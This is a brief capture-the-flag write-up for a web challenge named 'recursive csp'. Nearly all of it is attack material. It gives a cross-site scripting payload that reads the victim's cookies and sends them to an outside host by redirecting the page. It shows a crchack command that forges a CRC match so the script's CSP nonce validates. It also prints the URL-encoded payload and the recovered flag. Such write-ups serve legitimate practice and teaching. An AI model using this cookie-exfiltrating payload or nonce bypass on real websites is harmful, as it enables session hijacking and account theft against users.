# recursive csp (web)
Generated with [crchack](https://github.com/resilar/crchack)

```sh
echo '<script nonce="41414141">document.location=`https://seraphin.xyz/?${document.cookie}`</script>l' | ./crchack - 41414141 | xxd
```

```
?name=%3Cscript%20nonce%3D%2241414141%22%3Edocument%2Elocation%3D%60https%3A%2F%2Fseraphin%2Exyz%2F%3F%24%7Bdocument%2Ecookie%7D%60%3C%2Fscript%3El%0A%b7%a1%f8%23
```

```
dice{h0pe_that_d1dnt_take_too_l0ng}
```
